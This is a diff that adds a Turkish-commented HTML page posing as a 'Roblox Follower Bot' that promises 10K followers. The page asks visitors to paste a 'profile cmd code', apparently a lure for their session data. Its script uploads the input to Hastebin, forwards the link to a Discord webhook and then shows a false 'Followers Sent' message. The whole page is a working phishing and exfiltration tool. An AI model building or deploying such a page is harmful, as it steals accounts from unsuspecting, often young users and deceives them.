@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Frellower</title>
+    <style>
+        /* Genel vücut stili */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #181818;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            color: #f4f4f4;
+        }
+
+        /* Başlık stili */
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #4CAF50;
+        }
+
+        /* Yazı açıklaması */
+        p {
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #ccc;
+        }
+
+        /* Textarea kutusu */
+        textarea {
+            width: 100%;
+            max-width: 600px;
+            height: 200px;
+            padding: 10px;
+            font-size: 16px;
+            border: 2px solid #555;
+            border-radius: 8px;
+            background-color: #333;
+            color: #f4f4f4;
+            resize: none;
+        }
+
+        textarea:focus {
+            border-color: #4CAF50;
+            outline: none;
+        }
+
+        /* Buton stili */
+        button {
+            padding: 12px 24px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        /* Mesaj kutusu */
+        #message-container {
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+            font-size: 18px;
+            color: #4CAF50;
+        }
+
+        /* Mobile responsive tasarım */
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            textarea {
+                max-width: 100%;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h2>Frellower Roblox Follower Bot</h2>
+    <p>Please enter your 'ONLY' profile cmd code. Then click the 'Send' Button and get 10K FOLLOWERS in 10 minutes max!</p>
+
+    <textarea id="inputText" placeholder="Enter Profile CMD Code Here!"></textarea><br>
+    <button onclick="uploadText()">Send!</button>
+
+    <div id="message-container">
+        <p>Succes! Followers Sent🎉</p>
+    </div>
+
+    <script>
+        function uploadText() {
+            const text = document.getElementById("inputText").value;
+            const url = "https://hastebin.com/documents";  // Hastebin API URL
+
+            // Metni JSON formatında gönder
+            fetch(url, {
+                method: "POST",
+                body: JSON.stringify({ content: text }),
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                const link = "https://hastebin.com/" + data.key;
+
+                // Discord Webhook'a bağlantıyı gönder
+                sendToDiscord(link);
+
+                // Ekranda "Başarıyla gönderildi!" mesajı göster
+                document.getElementById("message-container").style.display = "block";
+            })
+            .catch(error => {
+                alert("Bir hata oluştu: " + error);
+            });
+        }
+
+        function sendToDiscord(link) {
+            const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';  // Webhook URL'nizi buraya yerleştirin
+            
+            const payload = {
+                content: `Yeni bir metin yüklendi: ${link}`,  // Hastebin'den alınan bağlantıyı içerir
+            };
+
+            // Webhook'a POST isteği gönder
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),  // JSON formatında veriyi gönder
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Mesaj başarıyla gönderildi.');
+                } else {
+                    console.log('Mesaj gönderilirken bir hata oluştu:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Webhook gönderme hatası:', error);
+            });
+        }
+    </script>
+
+</body>
+</html>
